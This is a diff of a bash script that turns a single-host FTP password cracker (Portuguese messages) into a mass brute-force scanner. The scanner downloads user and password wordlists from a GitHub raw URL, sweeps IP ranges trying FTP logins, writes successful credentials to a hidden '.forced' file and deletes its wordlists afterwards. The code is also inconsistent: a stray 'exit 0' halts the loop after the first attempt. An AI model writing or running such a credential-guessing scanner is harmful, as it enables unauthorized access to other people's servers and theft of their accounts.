@@ -1,35 +1,44 @@
 #!/bin/bash
 
-function save {
-
-	comp=$(ftp -n "$1" <<_CONEXAO
-	quote USER $2
-	quote PASS $3
-	quit
-	_CONEXAO
-	)
-
-if [ "$comp" = "Login incorrect." ]
-	then
-		return 1
-	else
-		return 0
-fi
-
+function force {
+	userdict="./.u$2"
+	passdict="./.p$2"
+	echo "directories: $userdict $passdict"
+	for user in `cat $userdict`; do
+		for pass in `cat $passdict`; do
+			result=$(ftp -in "$1" <<-EOF
+				user "$user" "$pass"
+				quit
+				EOF
+				)
+			exit 0
+			if [ "$result" = "Not connected." ]; then
+				return 0
+			elif [ "$result" != "Login incorrect." ]; then
+				echo "${1}, user: ${user}, pass: $pass" >> ./.forced
+				return 1
+			fi
+		done
+	done
 }
 
-curl
+randomname=$RANDOM
+curl -s https://raw.githubusercontent.com/ArchieSin314/TestSite/main/userdict > ./.u$randomname
+curl -s https://raw.githubusercontent.com/ArchieSin314/TestSite/main/passdict > ./.p$randomname
 
-for pass in `cat $wordlist`
- do
- 	echo -e "\033[1;34m[*]\033[0m Testando => $pass"
-	a=$(bftp $host $usuario $pass)
-	b=$(echo $?)
-	if [ "$b" = "1" ]
-	then
-		echo -e "\033[1;31m[-]\033[0m ERRO"
-	else
-		echo -e "\n\033[40;1;37m[+] P4s5W0rd Cr4ck3d: $pass\033[0m\n"
-		break
-	fi
-done
+r=$(($RANDOM%249)) #1st octet
+if [ $r -ne 127 ]; then
+	for i in $(seq 0 255); do #2nd octet
+		for j in $(seq 0 255); do #3rd octet
+			if [ $r -eq 192 ]; then
+				force $(echo "192.168.${i}.${j}") $randomname
+			else
+        			for k in $(seq 1 255); do #4th octet
+        				force $(echo "192.${i}.${j}.${k}") $randomname
+				done
+			fi
+		done
+	done
+fi
+
+rm ./.u$randomname ./.p$randomname
